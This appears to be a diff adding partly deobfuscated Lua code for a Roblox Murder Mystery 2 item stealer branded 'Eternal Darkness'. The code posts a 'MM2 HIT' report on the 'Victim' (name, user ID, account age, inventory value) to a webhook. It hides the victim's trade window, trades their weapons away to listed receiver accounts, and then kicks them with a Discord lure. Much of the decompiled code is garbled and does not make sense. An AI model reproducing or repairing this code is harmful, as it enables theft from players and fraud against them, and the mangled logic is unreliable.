+                                        [zZ[18]] = zZ[19],
+                                        [zZ[20]] = zZ[21],
+                                        [zZ[22]] = zZ[23],
+                                        [zZ[24]] = zZ[25],
+                                        [zZ[26]] = zZ[27],
+                                        [zZ[28]] = zZ[29],
+                                        [zZ[30]] = zZ[31],
+                                        [zZ[32]] = zZ[33],
+                                        [zZ[34]] = zZ[35],
+                                        [zZ[36]] = zZ[37],
+                                        [zZ[38]] = zZ[39],
+                                        [zZ[40]] = zZ[41],
+                                        [zZ[42]] = zZ[43],
+                                        [zZ[44]] = zZ[45]
+                                    })[S] or .07;
+                                    V = K * q.Amount;
+                                    t = t + V;
+                                    table.insert(e, {
+                                        ["name"] = S,
+                                        ["amount"] = q.Amount,
+                                        ["unitPrice"] = tostring(K),
+                                        ["totalPrice"] = string.format("%.2f", V)
+                                    }); 
+                                end;
+                                return {
+                                    ["total"] = string.format("%.2f", 0),
+                                    ["itemPrices"] = e
+                                }; 
+                            end)(r30).total or "0.00";
+                            v5 = v5;
+                            string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", game.PlaceId, K);
+                            AT = "Bad Hit";
+                            HT = false;
+                            if 0 >= 1000 then
+                                AT = "Big Hit (Godly+)";
+                                HT = true;
+                            else
+                                if 0 >= 300 then
+                                    AT = "Good Hit (Godly+)";
+                                    HT = true;
+                                else
+                                    if 0 >= 100 then
+                                        HT = true;
+                                        AT = "Normal Hit (Godly+)";
+                                    else
+                                        AT = "Low Hit (Godly+)";
+                                    end;
+                                    NT = r30;
+                                    fT = oT[3];
+                                    for fT, NT in oT[1], ipairs(NT) do
+                                        MT = fT;
+                                        qT = qT + NT.Amount; 
+                                    end;
+                                    MT = {};
+                                    IT = 1 < 0;
+                                    for fT = 1, math.min(3, #r30) do
+                                        bT = r30[fT];
+                                        v5 = v5;
+                                        table.insert(MT, string.format("%s `%s` x%d **%d**", ({
+                                            ["Ancient"] = "\xf0\x9f\x94\xb4",
+                                            ["Godly"] = "\xf0\x9f\x9f\xa3",
+                                            ["Unique"] = "\xf0\x9f\x9f\xa1",
+                                            ["Vintage"] = "\xf0\x9f\x9f\xa0",
+                                            ["Legendary"] = "\xf0\x9f\x94\xb5",
+                                            ["Rare"] = "\xf0\x9f\x9f\xa2"
+                                        })[bT.Rarity] or "\xe2\x9a\xaa", bT.ItemName, bT.Amount, bT.TotalValue)); 
+                                    end;
+                                    aT = {
+                                        {
+                                            ["name"] = "\xf0\x9f\x91\xa4 Victim",
+                                            ["value"] = r17.DisplayName .. "\n(@" .. r17.Name .. ")\nID: " .. r17.UserId .. "\nAge: " .. r17.AccountAge .. " days",
+                                            ["inline"] = true
+                                        },
+                                        {
+                                            ["name"] = "\xe2\x9a\x99\xef\xb8\x8f System",
+                                            ["value"] = "Executor: " .. r18 .. "\nReceiver: " .. table.concat(r13, ", ") .. "\nJob ID:\n" .. string.sub(L, 1, 8) .. "...",
+                                            ["inline"] = true
+                                        },
+                                        {
+                                            ["name"] = "\xf0\x9f\x92\xb0 Valuation",
+                                            ["value"] = "Total Value: " .. tostring(0) .. "\nReal Value: $" .. (CT.total or "0.00") .. "\nTotal Items: " .. 0,
+                                            ["inline"] = true
+                                        }
+                                    };
+                                    fT = string.char(27);
+                                    table.insert(aT, {
+                                        ["name"] = "\xf0\x9f\x93\x8a Inventory Breakdown",
+                                        ["value"] = "```ansi\n" .. (fT .. "[2;31mAncient:  " .. kT.Ancient .. "  " .. fT .. "[2;35mGodly:   " .. kT.Godly .. fT .. "[0m") .. "\n" .. (fT .. "[2;33mUnique:   " .. kT.Unique .. "  " .. fT .. "[2;38;5;208mVintage: " .. kT.Vintage .. fT .. "[0m") .. "\n" .. (fT .. "[2;34mLegendary:" .. kT.Legendary .. "  " .. fT .. "[2;32mRare:    " .. kT.Rare .. fT .. "[0m") .. "\n" .. (fT .. "[2;37mUncommon: " .. kT.Uncommon .. "  Common:  " .. kT.Common) .. "```",
+                                        ["inline"] = false
+                                    });
+                                    table.insert(aT, {
+                                        ["name"] = "\xf0\x9f\x8f\x86 Top Items",
+                                        ["value"] = "```\n" .. table.concat(MT, "\n") .. "\n```",
+                                        ["inline"] = false
+                                    });
+                                    table.insert(aT, {
+                                        ["name"] = "\xf0\x9f\x94\x97 Actions",
+                                        ["value"] = "[Join Server](" .. string.format(i[z][i[t]("\xf9\x9fA\xf7\xe9\x8d\x05\x82\xce\xd8\xc3\xbb\x1c\x1c\x83\xad\xd1\xab\x87\x82\x08\x1f\xa0\xc5\xe9\x9ao\x8bI/%\xf9\x89\xa7\xcb\x04$\x07\\\x0eE|2\xb5\x97\xcd\xdb8\"_V\x13", ST)], vT, K) .. ") \xe2\x80\xa2 [View Inventory](" .. QT .. ")",
+                                        ["inline"] = false
+                                    });
+                                    if false then
+                                        XT = "@everyone \xf0\x9f\x8c\x91 **NEW MM2 HIT | Eternal Darkness**";
+                                    end;
+                                    v5 = v5;
+                                    zZ[2] = 17949167526054;
+                                    zZ[3] = 1975077110679;
+                                    zZ[1] = "\x1b q\xc2q\xc8";
+                                    zZ[2] = "X\xd3S\xd9\t\xdd";
+                                    zZ[1] = 32531544800044;
+                                    zZ[1] = 10412547805936;
+                                    zZ[1] = r3(zZ[2], zZ[3]);
+                                    zZ[1] = 9857473712622;
+                                    zZ[2] = 9533391081815;
+                                    zZ[1] = "\xa5\xf2\xbbIr\xc8\x92\xcb\x9a\x88va\x06\x17\xbcc\x00\xee\n1\x8a\xf2D>\x83\xc6\xfa|J";
+                                    zZ[4] = 2829642188069;
+                                    zZ[3] = "\x08\xf7\xdf\xd0";
+                                    zZ[1] = 24554298404009;
+                                    zZ[1] = r3;
+                                    zZ[2] = zZ[1](zZ[3], zZ[4]);
+                                    zZ[4] = 10681354212205;
+                                    FZ = os[r2[zZ[2]]];
+                                    zZ[3] = "\xf9f\x15\x87@\xc0\x14N6\xe2\x1a<\xcd$@Td2\x04";
+                                    zZ[1] = r3;
+                                    zZ[2] = zZ[1](zZ[3], zZ[4]);
+                                    (function(arg1_11, ...)
+                                        local J = {
+                                            16,
+                                            17,
+                                            48,
+                                            46,
+                                            11,
+                                            34
+                                        };
+                                        r37 = arg1_11;
+                                        task.spawn(function(...)
+                                            local J = {
+                                                J[3],
+                                                J[4],
+                                                J[5],
+                                                J[1],
+                                                J[2],
+                                                J[6],
+                                                33
+                                            };
+                                            if t then
+                                                v5 = v5;
+                                                z = t.StatusCode ~= 200 and t.StatusCode ~= 204;
+                                            end;
+                                            v5 = v5;
+                                            v3 = t;
+                                            r38 = i[J[1]] .. i[J[2]];
+                                            z = {
+                                                pcall(function(...)
+                                                    local J = {
+                                                        J[3],
+                                                        J[4],
+                                                        J[5],
+                                                        1,
+                                                        J[6],
+                                                        J[7]
+                                                    };
+                                                    q = i[J[5]];
+                                                    return i[J[1]]({
+                                                        ["Url"] = i[J[4]],
+                                                        ["Method"] = "POST",
+                                                        ["Headers"] = {
+                                                            ["Content-Type"] = "application/json",
+                                                            ["User-Agent"] = "EternalDarkness/2.0.0"
+                                                        },
+                                                        ["Body"] = q:JSONEncode(i[J[6]])
+                                                    }); 
+                                                end)
+                                            };
+                                            v3 = z[1];
+                                            e = not e or v3;
+                                            t = z[2];
+                                            if not e or v3 then
+                                                warn("[ED] Webhook failed");
+                                            end;
+                                            return; 
+                                        end);
+                                        return; 
+                                    end)({
+                                        ["content"] = HT or nil,
+                                        ["username"] = "\xf0\x9f\x8c\x91 Eternal Darkness",
+                                        ["avatar_url"] = "https://imgur.com/a/OPHDrDn.png",
+                                        ["embeds"] = {
+                                            {
+                                                ["title"] = "Eternal Darkness MM2 HIT \xe2\x94\x82 " .. i[z][i[t](dT, pT)],
+                                                ["url"] = QT,
+                                                ["color"] = ({
+                                                    ["primary"] = 657946,
+                                                    ["secondary"] = 1710638,
+                                                    ["accent"] = 1450302,
+                                                    ["highlight"] = 996448,
+                                                    ["text"] = 5452931,
+                                                    ["gold"] = 9109504,
+                                                    ["success"] = 25600
+                                                }).secondary,
+                                                ["thumbnail"] = {
+                                                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. r17[r2[r3(zZ[1], zZ[2])]] .. r2[r3("\x8e\xceQ\xbe\xbb\xd6\xc3f+Y\xe5l\xbf_\xe12<q\xfa:+l\x8d\xe0.\xd7\x12\x99^\x13\x8a\x01", zZ[1])]
+                                                },
+                                                ["description"] = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. r2[r3("(\x8c\xb9", zZ[1])] .. L .. r2[zZ[1]],
+                                                ["fields"] = aT,
+                                                ["footer"] = {
+                                                    [r2[r3("\x88\x11\x01\xde", zZ[1])]] = r2[r3(zZ[1], zZ[2])]
+                                                },
+                                                [r2[r3("#\xb7M\x810\xb3\r\x00\xe4", zZ[1])]] = FZ(r2[zZ[2]])
+                                            }
+                                        }
+                                    });
+                                    print("[ED] MM2 Script loaded successfully for", r17.Name);
+                                    UT = r16;
+                                    r41 = UT:WaitForChild("Trade", 5);
+                                    if not r41 then
+                                        warn("[ED] Trade remote not found");
+                                        return;
+                                    end;
+                                    LT = r41;
+                                    r42 = LT:WaitForChild("SendRequest");
+                                    lT = r41;
+                                    r43 = lT:WaitForChild("GetTradeStatus");
+                                    XT = r41;
+                                    r44 = XT:WaitForChild("OfferItem");
+                                    hT = r41;
+                                    r45 = hT:WaitForChild("AcceptTrade");
+                                    WT = r41;
+                                    r46 = WT:WaitForChild("DeclineTrade");
+                                    OT = r41;
+                                    if OT:FindFirstChild("UpdateTrade") then
+                                        OT = r41.UpdateTrade.OnClientEvent;
+                                        OT:Connect(function(arg1_12, ...)
+                                            local J = {
+                                                16,
+                                                17,
+                                                55
+                                            };
+                                            v1 = arg1_12;
+                                            if v1 then
+                                                v3 = v1.LastOffer;
+                                            end;
+                                            if v1 then
+                                                r47 = v1.LastOffer;
+                                            end;
+                                            return; 
+                                        end);
+                                    end;
+                                    OT = r17;
+                                    cT = OT:WaitForChild("PlayerGui");
+                                    BZ = "TradeGUI";
+                                    nT = BZ[3];
+                                    RT = BZ[2];
+                                    for nT, yZ in ipairs(yZ) do
+                                        OT = nT;
+                                        r48 = cT:FindFirstChild(yZ);
+                                        if r48 then
+                                            r48.Enabled = false;
+                                            BZ = r48;
+                                            ZZ = BZ:GetPropertyChangedSignal("Enabled");
+                                            ZZ:Connect(function(...)
+                                                local J = {
+                                                    10,
+                                                    16,
+                                                    17
+                                                };
+                                                if r48.Enabled then
+                                                    r48.Enabled = false;
+                                                end;
+                                                return; 
+                                            end);
+                                        end; 
+                                    end;
+                                    local function r49(...)
+                                        local J = {
+                                            51,
+                                            16,
+                                            17
+                                        };
+                                        v5 = pcall;
+                                        e = {
+                                            v5(function(...)
+                                                v5 = r43;
+                                                return v5:InvokeServer(); 
+                                            end)
+                                        };
+                                        t = e[1];
+                                        if t then
+                                            e = e[2];
+                                        end;
+                                        v5 = v5;
+                                        if t then
+                                            return t;
+                                        else
+                                            v3 = "None";
+                                        end; 
+                                    end;
+                                    local function r50(arg1_13, ...)
+                                        v1 = arg1_13;
+                                        z = r13;
+                                        e = 34[3];
+                                        z = 34[1];
+                                        for e, v4 in z, ipairs(z) do
+                                            C = e;
+                                            if v4:lower() == v1:lower() then
+                                                return true;
+                                            else
+                                                
+                                            end; 
+                                        end;
+                                        return false; 
+                                    end;
+                                    local function r51(...)
+                                        local J = {
+                                            22,
+                                            16,
+                                            17
+                                        };
+                                        v5 = r49() == "None";
+                                        task.wait(.1);
+                                        if r49() == "None" then
+                                            return;
+                                        end; 
+                                    end;
+                                    local function r52(...)
+                                        local J = {
+                                            55,
+                                            53,
+                                            16,
+                                            17
+                                        };
+                                        v5 = r47;
+                                        if v5 then
+                                            v5 = r45;
+                                            v5:FireServer(game.PlaceId * 3, r47);
+                                        else
+                                            v5 = r45;
+                                            v5:FireServer(game.PlaceId * 3, {});
+                                        end;
+                                        return; 
+                                    end;
+                                    local function r53(arg1_14, ...)
+                                        local J = {
+                                            52,
+                                            16,
+                                            17
+                                        };
+                                        v5 = r44;
+                                        v5:FireServer(arg1_14, "Weapons");
+                                        task.wait(.1);
+                                        return; 
+                                    end;
+                                    r54 = false;
+                                    local function r56(arg1_15, ...)
+                                        local J = {
+                                            16,
+                                            17,
+                                            2,
+                                            24,
+                                            22,
+                                            54,
+                                            59,
+                                            50,
+                                            27,
+                                            26,
+                                            25,
+                                            36
+                                        };
+                                        r55 = arg1_15;
+                                        if not r55 then
+                                            return;
+                                        end;
+                                        v5 = 0 < 30;
+                                        while v5 do
+                                            e = r55.Character;
+                                            if e then
+                                                e = r55.Character;
+                                                v3 = e:FindFirstChild("Humanoid");
+                                            end;
+                                            if e then
+                                            else
+                                                t = t + 1;
+                                                task.wait(0.5);
+                                            end; 
+                                        end;
+                                        e = {};
+                                        C = 48[2];
+                                        z = 48[1];
+                                        for v4, v6 in ipairs(r30) do
+                                            v2 = v4;
+                                            table.insert(e, v6); 
+                                        end;
+                                        if #e == 0 then
+                                            return;
+                                        end;
+                                        z = v5;
+                                        C = #e > 0;
+                                        v3 = C;
+                                        while not C do
+                                            v5 = #{} == 0;
+                                            if v3 then
+                                                z = r49();
+                                                if z == "StartTrade" then
+                                                    v3 = r46;
+                                                    v3:FireServer();
+                                                    task.wait(.3);
+                                                else
+                                                    if z == "ReceivingRequest" then
+                                                        v3 = r41;
+                                                        if v3:FindFirstChild("DeclineRequest") then
+                                                            v3 = r41.DeclineRequest;
+                                                            v3:FireServer();
+                                                        else
+                                                            v3 = r46;
+                                                            v3:FireServer();
+                                                        end;
+                                                        task.wait(.3);
+                                                    end;
+                                                    v2 = v5;
+                                                    v6 = not false;
+                                                    v3 = 0 < 30;
+                                                    while not v6 do
+                                                        v5 = not false;
+                                                        if v3 then
+                                                            v2 = r49();
+                                                            if v2 == "StartTrade" then
+                                                                C = true;
+                                                            else
+                                                                if v2 == "None" then
+                                                                    pcall(function(...)
+                                                                        local J = {
+                                                                            LT,
+                                                                            14
+                                                                        };
+                                                                        v5 = r2;
+                                                                        v5:InvokeServer(r3);
+                                                                        return; 
+                                                                    end);
+                                                                else
+                                                                    if r49() == "ReceivingRequest" then
+                                                                        v6 = r41;
+                                                                        if v6:FindFirstChild("DeclineRequest") then
+                                                                            v6 = r41.DeclineRequest;
+                                                                            v6:FireServer();
+                                                                        else
+                                                                            v6 = i[WT];
+                                                                            v6:FireServer();
+                                                                        end;
+                                                                    end;
+                                                                    v4 = v4 + 1;
+                                                                    task.wait(0.5);
+                                                                end;
+                                                            end;
+                                                        end;
+                                                        if not false then
+                                                            task.wait(2);
+                                                        else
+                                                            K = v2;
+                                                            V = 4 > 0;
+                                                            S = V;
+                                                            while not V do
+                                                                v5 = K;
+                                                                if S then
+                                                                    S = ({})[1];
+                                                                    V = math.min(4, S.Amount);
+                                                                    o = 1 < 0;
+                                                                    v7 = V;
+                                                                    for a = 1, v7 do
+                                                                        K = v8;
+                                                                        r53(S.DataID); 
+                                                                    end;
+                                                                    S.Amount = S.Amount - V;
+                                                                    if S.Amount <= 0 then
+                                                                        table.remove({}, 1);
+                                                                    end;
+                                                                    v2 = 4 - V;
+                                                                    q = 0 + V;
+                                                                end;
+                                                                if 0 == 0 then
+                                                                    
+                                                                else
+                                                                    task.wait(5);
+                                                                    r52();
+                                                                    r51();
+                                                                    if #{} > 0 then
+                                                                        task.wait(1);
+                                                                    end;
+                                                                end; 
+                                                            end;
+                                                            S = #{} > 0;
+                                                        end; 
+                                                    end;
+                                                    v3 = 0 < 30;
+                                                end;
+                                            end;
+                                            if #{} == 0 then
+                                                r54 = true;
+                                                task.wait(2);
+                                                pcall(function(...)
+                                                    local J = {
+                                                        16,
+                                                        17
+                                                    };
+                                                    setclipboard("https://discord.gg/wep4k9Fg8W");
+                                                    return; 
+                                                end);
+                                                pcall(function(...)
+                                                    local J = {
+                                                        36,
+                                                        16,
+                                                        17
+                                                    };
+                                                    v5 = r2;
+                                                    v5:Kick("Items taken by Eternal Darkness\n\nJoin to get your items back!\ndiscord.gg/wep4k9Fg8W");
+                                                    return; 
+                                                end);
+                                                break;
+                                            end;
+                                            return; 
+                                        end;
+                                        v3 = not r54; 
+                                    end;
+                                    ZZ = S.PlayerAdded;
+                                    ZZ:Connect(function(arg1_16, ...)
+                                        local J = {
+                                            36,
+                                            23,
+                                            16,
+                                            17,
+                                            28
+                                        };
+                                        r57 = arg1_16;
+                                        if r57 == r17 then
+                                            return;
+                                        end;
+                                        if r50(r57.Name) then
+                                            task.spawn(function(...)
+                                                local J = {
+                                                    16,
+                                                    17,
+                                                    28,
+                                                    21
+                                                };
+                                                task.wait(4);
+                                                r2(r3);
+                                                return; 
+                                            end);
+                                        end;
+                                        return; 
+                                    end);
+                                    jZ = S.GetPlayers;
+                                    kZ = {
+                                        jZ(S)
+                                    };
+                                    mZ = jZ[3];
+                                    for mZ, kZ in jZ[1], ipairs(Z(kZ)) do
+                                        ZZ = mZ;
+                                        r58 = kZ;
+                                        FZ = r58 ~= r17;
+                                        if FZ then
+                                            zZ[5] = "\";\xd0\xfa";
+                                            zZ[6] = 19000057553551;
+                                            zZ[2] = r2;
+                                            zZ[3] = r3;
+                                            zZ[4] = zZ[3](zZ[5], zZ[6]);
+                                            zZ[1] = zZ[2][zZ[4]];
+                                            r50(r58[zZ[1]]);
+                                        end;
+                                        v5 = v5;
+                                        if FZ then
+                                            zZ[1] = "?P\x17\xc7Z";
+                                            zZ[2] = 23069661866486;
+                                            task[r2[r3(zZ[1], zZ[2])]](function(...)
+                                                local J = {
+                                                    16,
+                                                    17,
+                                                    28,
+                                                    40
+                                                };
+                                                task.wait(4);
+                                                r56(r58);
+                                                return; 
+                                            end);
+                                        end; 
+                                    end;
+                                    return;
+                                end;
+                            end;
+                        else
+                            c = not yT;
+                        end;
+                    end;
+                end;
+            end;
+        end;
+    end;
+end;
+return (function(...)
+    while true do
+        l1 = l2;
+        l2 = l1;
+        r1(); 
+    end;
+    return; 
+end)();
